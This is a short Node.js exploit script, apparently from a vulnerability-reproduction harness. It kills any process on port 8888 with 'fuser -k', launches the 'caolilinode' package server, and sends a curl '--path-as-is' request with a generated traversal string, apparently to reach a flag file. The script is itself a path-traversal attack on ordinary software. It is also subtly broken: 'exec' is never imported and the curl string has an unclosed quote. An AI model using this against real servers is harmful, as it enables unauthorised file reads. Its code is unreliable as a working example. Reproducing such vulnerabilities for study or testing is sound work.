const { execSync } = require("child_process");
const path = require("path");  // Import the path module

function exploitFunction(payload) {
  const { genstr } = payload;

  const pathToFlag = path.resolve(__dirname, "../flag.html");

  try {
    execSync("fuser -k 8888/tcp");
  } catch (e) {}

  const server = "node ./node_modules/caolilinode/caolili.js";
  exec(server, (error, stdout) => {});

  const attack_string = `curl -v --path-as-is "http://127.0.0.1:8888${genstr(50)}`; // Using genstr from payload
  exec(attack_string, (error, stdout) => {
    if (stdout) {
      console.log(stdout);
    } else {
      console.error("No output received");
    }
  });
}

module.exports = { exploitFunction };